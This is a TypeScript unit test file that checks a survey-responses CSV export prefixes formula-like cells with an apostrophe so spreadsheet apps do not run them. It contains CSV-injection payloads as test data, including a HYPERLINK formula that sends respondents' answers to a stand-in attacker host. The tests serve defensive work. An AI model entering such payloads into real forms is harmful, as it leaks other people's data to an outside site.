import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import Papa from 'papaparse';

import { buildSurveyResponsesCsv } from '../survey-responses-csv';

/**
 * Run with: `pnpm --filter @ever-works/web test:unit`
 *
 * Anyone can answer a published survey (`POST /api/surveys/[surveyId]/responses`) with any JSON
 * object, keys and values, and the admin responses page exports them to CSV. A cell that begins
 * with `=`, `+`, `-`, `@`, tab or CR runs as a formula when the admin opens the file in a
 * spreadsheet app, and `=HYPERLINK("https://attacker.example/?"&A2,"Open")` can send other
 * respondents' answers to another site. Answer keys become header cells, so they need the same
 * treatment as the answers.
 */

const HYPERLINK = '=HYPERLINK("https://attacker.example/?"&A2,"Open")';
const COMPLETED_AT = '2026-11-17T00:00:00.000Z';

/** Every cell of the CSV as the spreadsheet app sees it, header row first. */
const cells = (csv: string) => Papa.parse<string[]>(csv, { header: false }).data;

/** A cell a spreadsheet app would run as a formula. Plain numbers such as `-12.5` are data. */
const isFormulaCell = (cell: string) => /^[=+\-@\t\r]/.test(cell) && !/^[-+]?\d+(\.\d+)?$/.test(cell);

describe('buildSurveyResponsesCsv escapes formula cells', () => {
	it('escapes a "=x" answer key in the header and its "=x" answer in the row', () => {
		const csv = buildSurveyResponsesCsv([
			{ id: 'resp_1', userId: 'user_1', completedAt: COMPLETED_AT, data: { '=x': '=x' } }
		]);
		const [header, row] = cells(csv);
		assert.deepEqual(header, ['Response ID', 'User ID', 'Completed At', "'=x"]);
		assert.deepEqual(row, ['resp_1', 'user_1', COMPLETED_AT, "'=x"]);
	});

	it('leaves no cell a spreadsheet app would run as a formula', () => {
		const csv = buildSurveyResponsesCsv([
			{
				id: 'resp_1',
				userId: null,
				completedAt: COMPLETED_AT,
				data: {
					q1: HYPERLINK,
					q2: '+x',
					q3: '-x',
					q4: '@x',
					q5: '\t=1+1',
					q6: '\r=1+1',
					q7: '=x\ny',
					'@SUM(1,1)': 'header key',
					'+cmd': 'header key'
				}
			}
		]);
		const formulaCells = cells(csv)
			.flat()
			.filter((cell) => isFormulaCell(cell));
		assert.deepEqual(formulaCells, [], `unescaped formula cells:\n${csv}`);
	});

	it("prefixes each formula answer with ' and keeps the rest of it", () => {
		const answers: Record<string, string> = {
			q1: HYPERLINK,
			q2: '+x',
			q3: '-x',
			q4: '@x',
			q5: '\t=1+1',
			q6: '\r=1+1',
			q7: '=x\ny',
			q8: '=1+1'
		};
		const csv = buildSurveyResponsesCsv([{ id: 'resp_1', data: answers }]);
		const [header, row] = cells(csv);
		for (const [key, value] of Object.entries(answers)) {
			assert.equal(row[header.indexOf(key)], `'${value}`, `answer ${key}`);
		}
	});

	it('CONTROL: leaves plain numbers and ordinary text unchanged', () => {
		const csv = buildSurveyResponsesCsv([
			{
				id: 'resp_1',
				userId: null,
				completedAt: null,
				data: { a: '-12.5', b: -12.5, c: 'abc', d: 42, e: 'a, "quoted" answer', f: { nested: true } }
			}
		]);
		const [header, row] = cells(csv);
		assert.deepEqual(header, ['Response ID', 'User ID', 'Completed At', 'a', 'b', 'c', 'd', 'e', 'f']);
		assert.deepEqual(row, [
			'resp_1',
			'Anonymous',
			'',
			'-12.5',
			'-12.5',
			'abc',
			'42',
			'a, "quoted" answer',
			'{"nested":true}'
		]);
	});
});
